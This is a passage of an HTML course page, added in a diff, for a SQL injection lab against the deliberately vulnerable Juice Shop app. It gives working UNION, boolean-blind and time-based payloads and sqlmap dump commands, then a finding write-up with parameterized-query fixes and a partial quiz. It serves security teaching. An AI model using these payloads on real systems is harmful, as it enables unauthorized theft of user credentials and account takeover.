+              The complaint about a stray <code>)</code> means your input sits inside nested parentheses, so you'll need <code>'))</code> to break all the way out. And there's a bonus: an out-of-range <code>ORDER BY</code> error on this app literally says "should be between 1 and 9", which hands you the column count for free. You'll use both in the next section.
+            </p>
+          </div>
+        </div>
+
+        <details class="thought-accordion" style="margin-top:var(--space-3);">
+          <summary><span>🧩 Wait, why <code>'))</code> and not just <code>'</code>? (the parentheses, explained)</span></summary>
+          <div class="thought-accordion__content">
+            <p style="margin:0 0 var(--space-2);">The login was easy because its query is <strong>flat</strong>: <code>WHERE email='INPUT' AND password='…'</code>. One <code>'</code> and you're out in the open. The search query is not flat. This is the real query Juice Shop runs, your <code>q</code> value drops in where <code>INPUT</code> is:</p>
+            <div class="terminal-window" style="margin:0 0 var(--space-3);">
+              <div class="terminal-window__body"><pre><code>SELECT * FROM Products
+WHERE ((name LIKE '%INPUT%' OR description LIKE '%INPUT%') AND deletedAt IS NULL)
+ORDER BY name</code></pre></div>
+            </div>
+            <p style="margin:0 0 var(--space-2);">Your <code>INPUT</code> is boxed inside <strong>three layers</strong>. To run your own query you have to climb out of every one, in order:</p>
+            <div class="info-dense-card info-dense-card--warn" style="margin:0 0 var(--space-3);">
+              <div class="info-dense-card__title">Close them from the inside out</div>
+              <div class="info-dense-card__grid">
+                <div class="info-dense-card__cell">
+                  <span class="info-dense-card__label">1 · the string</span>
+                  <code>'</code> leaves <code>'%…%'</code>
+                </div>
+                <div class="info-dense-card__cell">
+                  <span class="info-dense-card__label">2 · inner bracket</span>
+                  <code>)</code> leaves <code>( name OR description )</code>
+                </div>
+                <div class="info-dense-card__cell">
+                  <span class="info-dense-card__label">3 · outer bracket</span>
+                  <code>)</code> leaves <code>( … AND deletedAt )</code>
+                </div>
+              </div>
+            </div>
+            <p style="margin:0 0 var(--space-2);">That's the <code>'))</code>. Then <code>--</code> comments out the leftover <code>%'…</code> tail the app wrote after your input. So <code>')) UNION SELECT … --</code> turns the whole thing into a clean <code>SELECT … UNION SELECT …</code> and your query runs.</p>
+            <p style="margin:0 0 var(--space-2);">Why feel it out one step at a time? On a real target you can't read the source like we just did, so the <strong>errors are your map</strong>:</p>
+            <div class="table-container">
+              <table class="data-table">
+                <thead><tr><th>You send</th><th>What happens in the query</th><th>Result</th></tr></thead>
+                <tbody>
+                  <tr><td><code>'</code></td><td>closes the string, but the app's own <code>))</code> still balances the brackets — odd but valid SQL, matches nothing</td><td><code>200</code> empty</td></tr>
+                  <tr><td><code>')</code></td><td>string + <strong>one</strong> bracket closed, but a second <code>)</code> is still open → brackets don't balance</td><td><code>500</code> <code>near ")"</code></td></tr>
+                  <tr><td><code>'))</code></td><td>all brackets closed, but the leftover <code>%'…</code> tail is now dangling junk</td><td><code>500</code></td></tr>
+                  <tr style="background:var(--color-accent-soft);"><td><code>'))</code> + <code>--</code></td><td>out of all three layers, tail commented away</td><td style="color:var(--color-accent);font-weight:700;">200, clean ✓</td></tr>
+                </tbody>
+              </table>
+            </div>
+            <p style="font-size:var(--font-size-xs);color:var(--color-text-muted);margin:var(--space-2) 0 0;">Same quote-closes-the-string idea as the login. The search just wraps it in brackets, so the escape is longer. Different query shape, different breakout, and you learn the shape from the errors.</p>
+          </div>
+        </details>
+
+      </section>
+
+      <!-- Section 5: Stretch, UNION -->
+      <section>
+        <h2 id="union-extraction">5. Pull the User Table Out <span style="font-size:var(--font-size-xs);color:var(--color-text-muted);font-family:var(--font-mono);">· exploit · tool 2: Burp Repeater</span></h2>
+
+        <div class="bento-card" style="margin-bottom:var(--space-3);border-left:3px solid var(--color-warn);">
+          <span class="comparison-badge" style="color:var(--color-warn);">🟡 STRETCH</span>
+          <p style="font-size:var(--font-size-sm);color:var(--color-text-secondary);margin:var(--space-2) 0 0;">
+            Now the job changes shape. You're about to send the <em>same</em> request over and over with one number nudged each time (<code>ORDER BY 1</code>, <code>2</code>, <code>3</code>…), then hand-craft a long payload. That's clumsy to redo in DevTools, and it's exactly the repetition Burp's <strong>Repeater</strong> was built for. This is the tool earning its keep, not a habit.
+          </p>
+        </div>
+
+        <div class="callout callout--tip" style="margin-bottom:var(--space-3);">
+          <span class="callout__icon">🧭</span>
+          <div class="callout__content">
+            <div class="callout__title">Get the request into Repeater</div>
+            <p style="margin:0;font-size:var(--font-size-sm);">
+              With Juice Shop proxied through Burp (same setup as Lab 02), do one search so a <code>GET /rest/products/search?q=apple</code> lands in <strong>Proxy → HTTP history</strong>. Right-click it → <strong>Send to Repeater</strong>. From here you type payloads raw in the request pane, no URL-encoding needed, and hit <strong>Send</strong> as many times as you like.
+            </p>
+          </div>
+        </div>
+
+        <div class="diagram-card">
+          <div class="diagram-card__title">
+            <span>UNION in two moves: count columns, then swap in your own</span>
+          </div>
+          <svg class="diagram-svg" viewBox="0 0 760 170" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Two-step UNION: count columns with ORDER BY, then UNION SELECT the users table">
+            <rect x="20" y="20" width="340" height="120" rx="8" fill="var(--color-bg-alt)" stroke="var(--color-warn)" stroke-width="1.5" />
+            <text x="190" y="44" fill="var(--color-warn)" font-family="var(--font-mono)" font-size="12" font-weight="700" text-anchor="middle">STEP 1 · count columns</text>
+            <text x="40" y="72" fill="var(--color-text-secondary)" font-family="var(--font-mono)" font-size="10">q=apple')) ORDER BY 1--  → ok</text>
+            <text x="40" y="92" fill="var(--color-text-secondary)" font-family="var(--font-mono)" font-size="10">q=apple')) ORDER BY 9--  → ok</text>
+            <text x="40" y="112" fill="var(--color-danger)" font-family="var(--font-mono)" font-size="10">q=apple')) ORDER BY 10-- → error</text>
+            <text x="40" y="130" fill="var(--color-accent)" font-family="var(--font-mono)" font-size="10">so the table has 9 columns.</text>
+            <line x1="360" y1="80" x2="400" y2="80" stroke="var(--color-accent)" stroke-width="2.5" marker-end="url(#arrow-spine)" />
+            <rect x="405" y="20" width="335" height="120" rx="8" fill="var(--color-accent-soft)" stroke="var(--color-accent)" stroke-width="1.5" />
+            <text x="572" y="44" fill="var(--color-accent)" font-family="var(--font-mono)" font-size="12" font-weight="700" text-anchor="middle">STEP 2 · UNION your query</text>
+            <text x="420" y="72" fill="var(--color-text-secondary)" font-family="var(--font-mono)" font-size="9.5">q=x')) UNION SELECT email,password,</text>
+            <text x="420" y="90" fill="var(--color-text-secondary)" font-family="var(--font-mono)" font-size="9.5">'3','4','5','6','7','8','9' FROM Users--</text>
+            <text x="420" y="120" fill="var(--color-accent)" font-family="var(--font-mono)" font-size="10">→ every email + hash comes back</text>
+            <text x="420" y="136" fill="var(--color-text-muted)" font-family="var(--font-mono)" font-size="10">   in the id and name fields</text>
+          </svg>
+        </div>
+
+        <div class="bento-card" style="margin:var(--space-4) 0;">
+          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:var(--space-2);">
+            <strong style="color:var(--color-warn);font-family:var(--font-mono);font-size:var(--font-size-sm);">🖐️ DO #4 · Count, then extract</strong>
+            <span class="comparison-badge" style="color:var(--color-warn);">8 min</span>
+          </div>
+          <p style="font-size:var(--font-size-sm);color:var(--color-text-secondary);margin:0 0 var(--space-2);">
+            All of this happens in one Repeater tab on the <code>search?q=</code> request. Change the value, Send, read the response, repeat.
+          </p>
+          <div class="info-dense-card info-dense-card--warn" style="margin:var(--space-2) 0;">
+            <div class="info-dense-card__title">Payloads (URL-decoded for reading)</div>
+            <div class="info-dense-card__grid">
+              <div class="info-dense-card__cell">
+                <span class="info-dense-card__label">Count up until error (10 breaks, so 9)</span>
+                <code>apple')) ORDER BY 10--</code>
+              </div>
+              <div class="info-dense-card__cell">
+                <span class="info-dense-card__label">Extract users (9 columns)</span>
+                <code>x')) UNION SELECT email,password,'3','4','5','6','7','8','9' FROM Users--</code>
+              </div>
+            </div>
+          </div>
+          <p style="font-size:var(--font-size-sm);color:var(--color-text-secondary);margin:var(--space-2) 0 0;">
+            <strong>What success looks like:</strong> the response is a list of "products" where the <code>id</code> field holds a real email like <code>admin@juice-sh.op</code> and the <code>name</code> field holds a long hex string (the password hash). Your data came back wearing a product's clothes.
+          </p>
+          <details class="thought-accordion" style="margin-top:var(--space-2);">
+            <summary>Exact column count and names depend on your Juice Shop version</summary>
+            <div class="thought-accordion__content">
+              <p style="margin:0;">Newer builds shift the <code>Products</code> column count and the <code>Users</code> column names around. That's not a bug in the lab, that's the real job: you find the count with <code>ORDER BY</code>, and if <code>UNION SELECT email,password,...</code> throws a type error, swap columns until the text ones line up. Working it out live is the skill. The number you land on is the right number.</p>
+            </div>
+          </details>
+        </div>
+
+        <figure style="margin:var(--space-4) 0;">
+          <img src="../assets/img/lab03/union-dump.png" alt="Juice Shop search response with the whole Users table injected as fake products: emails in the id field, MD5 password hashes in the name field" loading="lazy" style="width:100%;border:1px solid var(--color-border);border-radius:var(--radius-md);display:block;background:#fff;padding:var(--space-2);" />
+          <figcaption style="font-size:var(--font-size-xs);color:var(--color-text-muted);margin-top:var(--space-2);font-family:var(--font-mono);">
+            The real response from Juice Shop. Every user's email sits in the <code>id</code> field and their MD5 hash in <code>name</code>. You just dumped the whole user table through a search box.
+          </figcaption>
+        </figure>
+
+        <!-- Prediction Prompt #2 -->
+        <div class="prediction-prompt">
+          <div class="prediction-prompt__question">🤔 The password column comes back as <code>0192023a7bbd7325...</code>, not the actual password. Why, and is that a dead end?</div>
+          <div class="prediction-prompt__input-group">
+            <input type="text" class="prediction-prompt__input" placeholder="Your guess…" />
+            <button type="button" class="prediction-prompt__btn">Reveal</button>
+          </div>
+          <div class="prediction-prompt__reveal" hidden>
+            <span class="prediction-prompt__reveal-label">Answer</span>
+            It's an <strong>MD5 hash</strong>, not the password. Not a dead end at all: MD5 is fast and unsalted here, so those hashes crack in seconds against a wordlist (that's a Week 12 topic). Pulling the hash out through a search box is already a full user-database breach. You'd write that up today and worry about cracking later.
+          </div>
+        </div>
+      </section>
+
+      <!-- Section 6: Going Pro -->
+      <section>
+        <h2 id="going-pro">6. Going Pro: Blind SQLi and Automation <span style="font-size:var(--font-size-xs);color:var(--color-text-muted);font-family:var(--font-mono);">· exploit</span></h2>
+
+        <div class="bento-card" style="margin-bottom:var(--space-3);border-left:3px solid var(--color-danger);">
+          <span class="comparison-badge" style="color:var(--color-danger);">🔴 GOING PRO · career depth</span>
+          <p style="font-size:var(--font-size-sm);color:var(--color-text-secondary);margin:var(--space-2) 0 0;">
+            Everything so far showed you the data. In the real world the app usually shows you nothing, and you still have to win. That's blind SQLi. Then you learn to automate the grind.
+          </p>
+        </div>
+
+        <div class="comparison-grid" style="margin-bottom:var(--space-4);">
+          <div class="comparison-card comparison-card--cyan">
+            <div class="comparison-card__header">
+              <h3 class="comparison-card__title">👁️ Direct</h3>
+              <span class="comparison-badge" style="color:var(--color-cyan);">you SEE the data</span>
+            </div>
+            <ul class="comparison-list">
+              <li><span class="comparison-icon">🔹</span> Error-based: the app prints the query or the data.</li>
+              <li><span class="comparison-icon">🔹</span> UNION-based: results come back in the response.</li>
+              <li><span class="comparison-icon">🔹</span> Fast and obvious. Also the first thing developers fix.</li>
+            </ul>
+          </div>
+          <div class="comparison-card comparison-card--accent">
+            <div class="comparison-card__header">
+              <h3 class="comparison-card__title">🕶️ Blind</h3>
+              <span class="comparison-badge" style="color:var(--color-accent);">you INFER the data</span>
+            </div>
+            <ul class="comparison-list">
+              <li><span class="comparison-icon">🔹</span> Boolean: the page changes for true vs false, so you ask yes/no questions one bit at a time.</li>
+              <li><span class="comparison-icon">🔹</span> Time-based: <code>' OR SLEEP(5)--</code>. If the reply is slow, the answer is yes.</li>
+              <li><span class="comparison-icon">🔹</span> Slow by hand. This is exactly what tools were built for.</li>
+            </ul>
+          </div>
+        </div>
+
+        <!-- Expanded: how blind actually works, worked live on the Juice Shop search -->
+        <h3 id="blind-how" style="margin-top:var(--space-5);">Blind, in plain terms: it's 20 questions</h3>
+        <p class="lab-lead" style="margin-bottom:var(--space-3);">
+          The database still knows the answer. The app just won't print it. So instead of asking "what's the password?" (you'd never see the reply), you ask questions it can only answer <strong>yes or no</strong>, and you watch the one thing you <em>can</em> see. Let's pull the admin's password hash out of the <strong>same search box</strong> you've been using, without the search ever showing it to you.
+        </p>
+
+        <div class="diagram-card" style="margin-bottom:var(--space-4);">
+          <div class="diagram-card__title">
+            <span>🔵 Boolean blind · watch the page</span>
+            <span style="color:var(--color-cyan);">products appear, or they don't</span>
+          </div>
+          <p style="font-size:var(--font-size-sm);color:var(--color-text-secondary);margin:var(--space-2) var(--space-3);">
+            <strong>Step 1, find a yes/no you can see.</strong> The search gives you two states you can tell apart: products come back, or nothing does. Leave the term empty (so <code>LIKE '%'</code> matches everything) and bolt a condition on the end. Flip the condition and the products appear or vanish on command:
+          </p>
+          <div class="terminal-window" style="margin:0 var(--space-3) var(--space-3);">
+            <div class="terminal-window__body"><pre><code>?q=')) AND 1=1--   <span style="color:var(--color-accent);">→ 56 products   (TRUE)</span>
+?q=')) AND 1=2--   <span style="color:var(--color-danger);">→ 0 products    (FALSE)</span></code></pre></div>
+          </div>
+          <p style="font-size:var(--font-size-sm);color:var(--color-text-secondary);margin:0 var(--space-3) var(--space-3);">
+            <strong>Step 2, replace the condition with a question about the password.</strong> You can't read the admin hash, but you can ask whether its first character is above or below a guess. Products back = yes, none = no:
+          </p>
+          <div class="terminal-window" style="margin:0 var(--space-3) var(--space-3);">
+            <div class="terminal-window__body"><pre><code>?q=')) AND UNICODE((SELECT SUBSTR(password,1,1) FROM Users WHERE id=1)) &gt; 79 --</code></pre></div>
+          </div>
+          <p style="font-size:var(--font-size-sm);color:var(--color-text-secondary);margin:0 var(--space-3) var(--space-3);">
+            Here's the real trick: every character <strong>is a number</strong>, its ASCII code. <code>UNICODE(...)</code> gives you that code, and printable characters run <code>32</code> to <code>126</code>. So you're not guessing letters, you're <strong>binary-searching a number</strong>: start in the middle of 32–126, and each yes/no cuts the range in half. (The admin hash's first char is <code>0</code>, which is code <code>48</code>.)
+          </p>
+          <div class="table-container" style="padding:0 var(--space-3) var(--space-3);">
+            <table class="data-table">
+              <thead><tr><th>Is the code &gt; …</th><th>Products?</th><th>Range still possible</th></tr></thead>
+              <tbody>
+                <tr><td><code>79</code> &nbsp;(middle of 32–126)</td><td style="color:var(--color-danger);">0 · no</td><td><code>32–79</code></td></tr>
+                <tr><td><code>55</code> &nbsp;(middle of 32–79)</td><td style="color:var(--color-danger);">0 · no</td><td><code>32–55</code></td></tr>
+                <tr><td><code>43</code></td><td style="color:var(--color-accent);">56 · yes</td><td><code>44–55</code></td></tr>
+                <tr><td><code>49</code></td><td style="color:var(--color-danger);">0 · no</td><td><code>44–49</code></td></tr>
+                <tr><td><code>46</code></td><td style="color:var(--color-accent);">56 · yes</td><td><code>47–49</code></td></tr>
+                <tr><td><code>48</code></td><td style="color:var(--color-danger);">0 · no</td><td><code>47–48</code></td></tr>
+                <tr><td><code>47</code></td><td style="color:var(--color-accent);">56 · yes</td><td><code>48</code> → code is <code>48</code> = <code>'0'</code> ✓</td></tr>
+              </tbody>
+            </table>
+          </div>
+          <p style="font-size:var(--font-size-sm);color:var(--color-text-secondary);margin:0 var(--space-3) var(--space-3);">
+            Seven yes/no questions pin one character exactly, because halving ~95 printable codes takes about <code>log₂(95) ≈ 7</code> steps. That's what "binary search" buys you: 7 questions instead of asking about all 95 characters one by one. Then bump the position to <code>SUBSTR(password,2,1)</code> and do the next character, until the whole hash is spelled out, and the page never printed a single byte of it.
+          </p>
+          <p style="font-size:var(--font-size-xs);color:var(--color-text-muted);margin:0 var(--space-3) var(--space-3);">
+            (These are the real row counts from Juice Shop. SQLite accepts both <code>SUBSTR</code> and <code>SUBSTRING</code>, and <code>UNICODE()</code> for the code; other engines use <code>ASCII()</code> / <code>ORD()</code>. All row counts verified live.)
+          </p>
+        </div>
+
+        <div class="diagram-card" style="margin-bottom:var(--space-4);">
+          <div class="diagram-card__title">
+            <span>🟣 Time-based blind · watch the clock</span>
+            <span style="color:var(--color-accent);">when even "products vs none" is gone</span>
+          </div>
+          <p style="font-size:var(--font-size-sm);color:var(--color-text-secondary);margin:var(--space-2) var(--space-3);">
+            Sometimes the page looks <em>identical</em> no matter what, nothing to watch at all. So you give "true" a tell the server can't hide: a deliberate delay. Same question, but the answer is in <strong>how long the reply takes</strong>.
+          </p>
+          <div class="terminal-window" style="margin:0 var(--space-3) var(--space-3);">
+            <div class="terminal-window__body"><pre><code>... AND (CASE WHEN SUBSTR(password,1,1)='0' THEN <span style="color:var(--color-accent);">[wait 5 seconds]</span> ELSE 0 END)--</code></pre></div>
+          </div>
+          <ul style="font-size:var(--font-size-sm);color:var(--color-text-secondary);margin:0 var(--space-3) var(--space-3);padding-left:var(--space-4);display:flex;flex-direction:column;gap:4px;">
+            <li>Reply snaps back in <strong>~0.1s</strong> → guess was wrong.</li>
+            <li>Reply takes <strong>5 seconds</strong> → guess was right.</li>
+          </ul>
+          <p style="font-size:var(--font-size-xs);color:var(--color-text-muted);margin:0 var(--space-3) var(--space-3);">
+            The <code>[wait]</code> depends on the engine: MySQL <code>SLEEP(5)</code>, Postgres <code>pg_sleep(5)</code>, SQL Server <code>WAITFOR DELAY '0:0:5'</code>. <strong>SQLite has no sleep function, so you can't demo this one on Juice Shop</strong>, it's for the other engines (and PortSwigger's blind labs below). The logic is identical to boolean, the clock is just the only thing leaking.
+          </p>
+        </div>
+
+        <div class="callout callout--warning" style="margin-bottom:var(--space-4);">
+          <span class="callout__icon">🐌</span>
+          <div class="callout__content">
+            <div class="callout__title">Why this is a grind (and why sqlmap exists)</div>
+            <p style="margin:0;font-size:var(--font-size-sm);">
+              One request buys you <strong>one yes/no</strong>, basically one bit of information. A 20-character password is roughly 20 × 5 ≈ <strong>100 requests</strong>, and that's for a single value. Now multiply by every user and every column you want. Nobody does this by hand past proving it works. This exact loop, guess, send, check the page or the clock, narrow, is what <code>sqlmap</code> automates in the next section.
+            </p>
+          </div>
+        </div>
+
+        <details class="thought-accordion" style="margin-bottom:var(--space-4);">
+          <summary><span>📻 One more term: in-band vs out-of-band</span></summary>
+          <div class="thought-accordion__content">
+            <p style="margin:0 0 var(--space-2);font-size:var(--font-size-sm);">This is about <strong>which channel the answer comes back on</strong>.</p>
+            <ul style="margin:0 0 var(--space-2);padding-left:var(--space-4);display:flex;flex-direction:column;gap:6px;font-size:var(--font-size-sm);">
+              <li><strong>In-band</strong>: the answer rides the <em>same HTTP response</em> you're already reading, whether that's the body (error, UNION, boolean) or just its timing (time-based). Everything in this lab is in-band.</li>
+              <li><strong>Out-of-band</strong>: the response tells you nothing, so you force the database to reach out over a <em>different</em> channel, like a DNS or HTTP callback to a server you control, and read the data there.</li>
+            </ul>
+            <p style="margin:0;font-size:var(--font-size-sm);">So it's a separate question from "do I see or infer the data". A blind attack is still in-band as long as you're reading the same response. Out-of-band is the rare fallback for when even timing gives you nothing.</p>
+          </div>
+        </details>
+
+        <div class="target-launcher target-launcher--hosted" data-target-slug="portswigger">
+          <div class="target-launcher__header">
+            <div class="target-launcher__title-group">
+              <span class="target-launcher__icon">🎓</span>
+              <div>
+                <h3 class="target-launcher__title">PortSwigger: the SQLi ladder</h3>
+                <div class="target-launcher__platform">Hosted · free account · the deepest free SQLi labs there are</div>
+              </div>
+            </div>
+            <span class="target-launcher__badge">🌐 Go Deeper</span>
+          </div>
+          <div class="target-launcher__body">
+            <div class="target-launcher__step">
+              <span class="target-launcher__step-label">🖐️ DO #5 · Try the PortSwigger SQLi labs</span>
+              <a class="target-launcher__url" href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables" target="_blank" rel="noopener noreferrer">UNION: retrieve data from other tables</a>
+              <a class="target-launcher__url" href="https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses" target="_blank" rel="noopener noreferrer" style="margin-top:6px;">Blind: conditional (boolean) responses</a>
+              <a class="target-launcher__url" href="https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval" target="_blank" rel="noopener noreferrer" style="margin-top:6px;">Blind: time delays + data retrieval</a>
+            </div>
+          </div>
+          <div class="target-launcher__footer">
+            <span>Sign in at <code>portswigger.net</code> → start a "Lab" → fresh disposable URL, proxied through Burp</span>
+            <a class="target-launcher__catalog-link" href="../tools.html#portswigger">→ platform card</a>
+          </div>
+        </div>
+
+        <h3 id="sqlmap" style="margin-top:var(--space-5);">6.1 sqlmap: automate the grind</h3>
+        <p class="lab-lead">
+          You did UNION by hand so you know what the tool is doing. Now let it do the boring part. <code>sqlmap</code> detects the injection, counts columns, and dumps tables for you, including the blind cases you'd never grind out manually.
+        </p>
+
+        <div class="callout callout--warning">
+          <span class="callout__icon">🧠</span>
+          <div class="callout__content">
+            <div class="callout__title">Why we saved this for the end</div>
+            <p style="margin:0;font-size:var(--font-size-sm);">
+              If <code>sqlmap</code> is the first thing you learn, it becomes a magic button you can't explain in an interview. You just did it by hand, so when the tool says "UNION query, 9 columns", you know exactly what that means. That's the difference between running a tool and understanding one.
+            </p>
+          </div>
+        </div>
+
+        <div class="bento-card" style="margin:var(--space-4) 0;">
+          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:var(--space-2);">
+            <strong style="color:var(--color-danger);font-family:var(--font-mono);font-size:var(--font-size-sm);">🖐️ DO #6 · Point sqlmap at the search endpoint</strong>
+            <span class="comparison-badge" style="color:var(--color-danger);">optional</span>
+          </div>
+          <div class="terminal-window" style="margin:0;">
+            <div class="terminal-window__header">
+              <div class="terminal-window__controls">
+                <span class="terminal-dot terminal-dot--red"></span>
+                <span class="terminal-dot terminal-dot--yellow"></span>
+                <span class="terminal-dot terminal-dot--green"></span>
+              </div>
+              <span class="terminal-window__title">bash · sqlmap against Juice Shop</span>
+              <button type="button" class="terminal-copy-btn">Copy</button>
+            </div>
+            <div class="terminal-window__body">
+<pre><code># detect + list databases
+sqlmap -u "http://localhost:3000/rest/products/search?q=apple" --batch --dbs
+
+# dump the Users table once it's found
+sqlmap -u "http://localhost:3000/rest/products/search?q=apple" --batch -T Users --dump</code></pre>
+            </div>
+          </div>
+          <details class="thought-accordion">
+            <summary>sqlmap says "not injectable" but you cracked it by hand?</summary>
+            <div class="thought-accordion__content">
+              <p style="margin:0;">The search sink sits inside <code>'))</code>, which sqlmap's default probes don't always guess. Give it a nudge: add <code>--prefix="'))" --suffix="--"</code> and bump <code>--level=3 --risk=2</code>. This is the everyday reality of automation: the tool is fast, but you're the one who knows the shape of the query. That knowledge came from doing it by hand first.</p>
+            </div>
+          </details>
+        </div>
+
+        <div class="callout callout--tip">
+          <span class="callout__icon">🧪</span>
+          <div class="callout__content">
+            <div class="callout__title">Want filter-bypass practice at home?</div>
+            <p style="margin:0;font-size:var(--font-size-xs);">
+              <strong>DVWA</strong> (Damn Vulnerable Web App) has a SQLi page with Low / Medium / High security levels, so you can watch the same payload get blocked and then rebuild it to slip past a filter. Totally optional, and a great weekend rabbit hole.
+            </p>
+          </div>
+        </div>
+      </section>
+
+      <!-- Section 7: Document -->
+      <section>
+        <h2 id="write-the-finding">7. Write the Finding <span style="font-size:var(--font-size-xs);color:var(--color-text-muted);font-family:var(--font-mono);">· document</span></h2>
+        <p class="lab-lead">
+          A shell nobody wrote down never happened. The report is what the client pays for, so every lab from now on ends by turning one thing you found into a proper finding. Fill this out for the SQLi you just landed.
+        </p>
+
+        <div class="diagram-card">
+          <div class="diagram-card__title">
+            <span>📓 FINDING · SQL Injection in product search</span>
+            <span style="color:var(--color-danger);">severity: Critical</span>
+          </div>
+          <div class="table-container">
+            <table class="data-table">
+              <tbody>
+                <tr><td style="white-space:nowrap;"><strong>Title</strong></td><td>SQL injection in <code>/rest/products/search</code> (<code>q</code> parameter) and login</td></tr>
+                <tr><td><strong>Severity</strong></td><td>Critical · <code>CVSS 9.8</code> (network, no auth, no user action, full data read)</td></tr>
+                <tr><td><strong>Affected endpoint</strong></td><td><code>GET /rest/products/search?q=</code> and <code>POST /rest/user/login</code></td></tr>
+                <tr><td><strong>Steps to reproduce</strong></td><td>1. Send <code>q=')</code> → server returns a SQL error that leaks the engine and a stack trace. 2. Count columns with <code>ORDER BY</code> (out-of-range error confirms 9). 3. <code>UNION SELECT</code> the <code>Users</code> table → every email and password hash returns in the response.</td></tr>
+                <tr><td><strong>Impact</strong></td><td>Full read of the user table (emails + password hashes), and authentication bypass to any account including admin. Complete account takeover.</td></tr>
+                <tr><td><strong>Remediation</strong></td><td>Use parameterized queries / prepared statements. Never build SQL by string concatenation. Add least-privilege DB accounts and generic error pages.</td></tr>
+              </tbody>
+            </table>
+          </div>
+          <p style="font-size:var(--font-size-xs);color:var(--color-text-muted);margin:var(--space-2) 0 0;">CVSS looks scary but it's just a scoring form. You'll fill one properly in Week 9. For now, "no login needed + reads the whole database" is why this is a 9.8.</p>
+        </div>
+
+        <h3 id="the-fix" style="margin-top:var(--space-4);">The one-line fix, side by side</h3>
+        <div class="comparison-grid" style="margin-top:var(--space-2);">
+          <div class="comparison-card comparison-card--accent">
+            <div class="comparison-card__header">
+              <h3 class="comparison-card__title">💥 Vulnerable</h3>
+              <span class="comparison-badge" style="color:var(--color-danger);border-color:rgba(255,51,102,0.4);">string concat</span>
+            </div>
+            <div class="terminal-window" style="margin:0;">
+              <div class="terminal-window__body">
+<pre><code>// input pasted straight in
+const q =
+ "SELECT * FROM users WHERE email='"
+ + email + "' AND password='"
+ + pass + "'";
+db.run(q);</code></pre>
+              </div>
+            </div>
+          </div>
+          <div class="comparison-card comparison-card--cyan">
+            <div class="comparison-card__header">
+              <h3 class="comparison-card__title">✅ Fixed</h3>
+              <span class="comparison-badge" style="color:var(--color-cyan);border-color:rgba(0,229,255,0.4);">parameterized</span>
+            </div>
+            <div class="terminal-window" style="margin:0;">
+              <div class="terminal-window__body">
+<pre><code>// input stays DATA, never code
+const q =
+ "SELECT * FROM users WHERE "
+ + "email=? AND password=?";
+db.run(q, [email, pass]);</code></pre>
+              </div>
+            </div>
+          </div>
+        </div>
+        <p style="font-size:var(--font-size-sm);color:var(--color-text-secondary);margin:var(--space-3) 0 0;">
+          The <code>?</code> placeholders are the whole fix. The database treats whatever you pass as data, so a <code>'</code> is just a quote character in a string, not the end of one. Same idea in every language: prepared statements in Java, <code>%s</code> params in Python, parameter binding in PHP PDO.
+        </p>
+      </section>
+
+      <!-- Section 8: Quiz -->
+      <section class="quiz-section">
+        <div class="quiz-section__header">
+          <h2 class="quiz-section__title" id="quiz">Lab 03 Self-Assessment · 7 questions</h2>
+          <span class="quiz-xp-badge">🖐️ DO #7</span>
+        </div>
+
+        <!-- Q1 MCQ: root cause -->
+        <div class="quiz-card" data-question-id="lab03-q1">
+          <div class="quiz-question">
+            Q1: What actually causes a SQL injection?
+          </div>
+          <div class="quiz-options">
+            <button type="button" class="quiz-option" data-correct="false" data-feedback="A weak password is a different problem. SQLi bypasses the check entirely, no matter how strong the password is.">
+              A) Users pick weak passwords.
+            </button>
+            <button type="button" class="quiz-option" data-correct="true" data-feedback="Correct. The app builds its query by gluing your input into a string, so your input can escape the string and become code. Parameterized queries fix exactly this.">
+              B) The app mixes your input into the query as code instead of keeping it as data.
+            </button>
+            <button type="button" class="quiz-option" data-correct="false" data-feedback="The database being fast doesn't cause the bug. sqlmap being fast just makes exploiting it easier.">
+              C) The database is too fast.
+            </button>
+          </div>
+          <div class="quiz-feedback"></div>
+        </div>
+
+        <!-- Q2 MCQ: what does -- do -->
+        <div class="quiz-card" data-question-id="lab03-q2">
+          <div class="quiz-question">
+            Q2: In <code>' OR 1=1--</code>, what job is the <code>--</code> doing?
+          </div>
+          <div class="quiz-options">
+            <button type="button" class="quiz-option" data-correct="false" data-feedback="It's not subtraction. In SQL, -- starts a comment.">A) Subtracts one from the result.</button>
+            <button type="button" class="quiz-option" data-correct="true" data-feedback="Correct. Everything after -- is a comment, so the app's own ' AND password=... tail gets ignored and can't break your payload.">B) Comments out the rest of the app's query, including the password check.</button>
+            <button type="button" class="quiz-option" data-correct="false" data-feedback="It doesn't close the string. Your leading ' did that.">C) Closes the open string.</button>
+          </div>
+          <div class="quiz-feedback"></div>
+        </div>
+
+        <!-- Q3 MCQ: UNION rule -->
+        <div class="quiz-card" data-question-id="lab03-q3">
+          <div class="quiz-question">
+            Q3: A <code>UNION SELECT</code> keeps failing until you get the column count right. Why does the count matter?
+          </div>
+          <div class="quiz-options">
+            <button type="button" class="quiz-option" data-correct="false" data-feedback="Speed has nothing to do with it. The database refuses to run it at all.">A) More columns makes it run faster.</button>
+            <button type="button" class="quiz-option" data-correct="true" data-feedback="Correct. UNION glues two result sets together, and SQL requires both SELECTs to return the same number of columns or it refuses.">B) UNION requires both queries to return the same number of columns.</button>
+            <button type="button" class="quiz-option" data-correct="false" data-feedback="Column count isn't about permissions. It's a structural rule of UNION.">C) Each column needs its own login.</button>
+          </div>
+          <div class="quiz-feedback"></div>
+        </div>
+
+        <!-- Q4 MCQ: blind -->
+        <div class="quiz-card" data-question-id="lab03-q4">
+          <div class="quiz-question">
+            Q4: The app returns no data and no error, but a payload with <code>SLEEP(5)</code> makes the response take 5 seconds. What kind of SQLi is this?
+          </div>
+          <div class="quiz-options">
+            <button type="button" class="quiz-option" data-correct="false" data-feedback="Error-based needs a visible error. You got silence plus a delay.">A) Error-based</button>
+            <button type="button" class="quiz-option" data-correct="false" data-feedback="UNION-based returns data in the response. Here nothing comes back except a delay.">B) UNION-based</button>
+            <button type="button" class="quiz-option" data-correct="true" data-feedback="Correct. Time-based blind: the delay is the answer. Slow reply = your condition was true. This is the grind sqlmap automates.">C) Time-based blind</button>
+          </div>
+          <div class="quiz-feedback"></div>
+        </div>
+
+        <!-- Q5 MCQ: the fix -->
+        <div class="quiz-card" data-question-id="lab03-q5">
+          <div class="quiz-question">
